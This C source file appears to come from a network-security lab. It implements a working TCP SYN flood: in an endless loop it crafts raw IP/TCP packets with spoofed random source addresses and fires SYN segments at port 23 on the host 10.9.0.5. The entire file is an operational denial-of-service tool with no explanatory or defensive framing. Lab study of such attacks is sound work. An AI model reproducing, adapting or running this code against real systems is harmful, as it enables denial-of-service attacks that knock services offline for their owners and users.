#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <stdlib.h>
#include <time.h>

/* IP Header */
struct ipheader {
    unsigned char      iph_ihl:4, //IP header length
                       iph_ver:4; //IP version
    unsigned char      iph_tos; //Type of service
    unsigned short int iph_len; //IP Packet length (data + header)
    unsigned short int iph_ident; //Identification
    unsigned short int iph_flag:3, //Fragmentation flags
                       iph_offset:13; //Flags offset
    unsigned char      iph_ttl; //Time to Live
    unsigned char      iph_protocol; //Protocol type
    unsigned short int iph_chksum; //IP datagram checksum
    struct  in_addr    iph_sourceip; //Source IP address
    struct  in_addr    iph_destip;   //Destination IP address
};

/* TCP header */
typedef unsigned int tcp_seq;

struct sniff_tcp {
	unsigned short th_sport;	/* source port */
	unsigned short th_dport;	/* destination port */
	tcp_seq th_seq;		/* sequence number */
	tcp_seq th_ack;		/* acknowledgement number */
	unsigned char th_offx2;	/* data offset, rsvd */
#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
	unsigned char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
	unsigned short th_win;		/* window */
	unsigned short th_sum;		/* checksum */
	unsigned short th_urp;		/* urgent pointer */
};

void send_to(struct ipheader* ip){
    int sd;
    struct sockaddr_in sin;
    /* Create a raw socket with IP protocol. The IPPROTO_RAW parameter
    * tells the sytem that the IP header is already included;
    * this prevents the OS from adding another IP header. */
    sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd < 0) {
        perror("socket() error"); exit(-1);
    }
    int enable = 1;
    setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    sin.sin_family = AF_INET;
    sin.sin_addr = ip->iph_destip;

    // Note: you should pay attention to the network/host byte order.
    /* Send out the IP packet.
    * ip_len is the actual size of the packet. */
    if(sendto(sd, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto() error"); exit(-1);
    }
}

uint16_t compute_checksum(const unsigned char *buf, size_t size) {
    size_t i;
    uint64_t sum = 0;

    for (i = 0; i < size; i += 2) {
        sum += *(uint16_t *)buf;
        buf += 2;
    }
    if (size - i > 0) {
        sum += *(uint8_t *)buf;
    }

    while ((sum >> 16) != 0) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (uint16_t)~sum;
}

unsigned int randnum(int bits){
    unsigned int random_number = 0;
    for (int i = 0; i < bits/8; i++) {
        random_number = (random_number << 8) | (rand() & 0xFF);
    }

    return random_number;
}

uint16_t tcpcsum(struct ipheader *ip, struct sniff_tcp* tcp) {
	uint8_t *tempbuf = (uint8_t *)malloc(12+sizeof(*tcp));
	if(tempbuf == NULL) {
    
		fprintf(stderr,"Out of memory: TCP checksum not computed\n");
		return 0;
	}
	/* Set up the pseudo header */
	memcpy(tempbuf,&(ip->iph_sourceip),sizeof(uint32_t));
	memcpy(&(tempbuf[4]),&(ip->iph_destip),sizeof(uint32_t));
	tempbuf[8]=(uint8_t)0;
	tempbuf[9]=(uint8_t)ip->iph_protocol;
	tempbuf[10]=(uint16_t)(sizeof(*tcp)&0xFF00)>>8;
	tempbuf[11]=(uint16_t)(sizeof(*tcp)&0x00FF);
	/* Copy the TCP header and data */
	memcpy(tempbuf+12,(void*)tcp,sizeof(*tcp));
	/* CheckSum it */
	uint16_t res = compute_checksum(tempbuf,12 + sizeof(*tcp));
	free(tempbuf);
    return res;
}

int main() {
    srand((unsigned)time(NULL));
	char buffer[1500];
	memset(buffer, 0, 1500);
	struct ipheader *ip = (struct ipheader *) buffer;
    struct sniff_tcp *tcp= (struct sniff_tcp *) (buffer + sizeof(struct ipheader));
	// Filling in UDP Data field
    char *payload = (char*) (buffer + sizeof(struct ipheader) + sizeof(struct sniff_tcp));
	// Fill in the IP header
	ip->iph_ver = 4;
	ip->iph_ihl = 5;
	ip->iph_ttl = 20;
	ip->iph_destip.s_addr = inet_addr("10.9.0.5");
	ip->iph_protocol = IPPROTO_TCP;
    ip->iph_len = htons(sizeof(*tcp) + sizeof(*ip));
    while(1){
	    ip->iph_sourceip.s_addr = randnum(32);
        tcp->th_sport = randnum(16);
        tcp->th_dport = htons(23);
        tcp->th_seq = randnum(32);
        tcp->th_ack = 0;
        tcp->th_offx2 = 0b01010000;
        tcp->th_flags = 0b00000010;
        tcp->th_sum = 0;
        tcp->th_sum = tcpcsum(ip,tcp);
        send_to(ip);
        sleep(0.001);
    }
	return 0;
}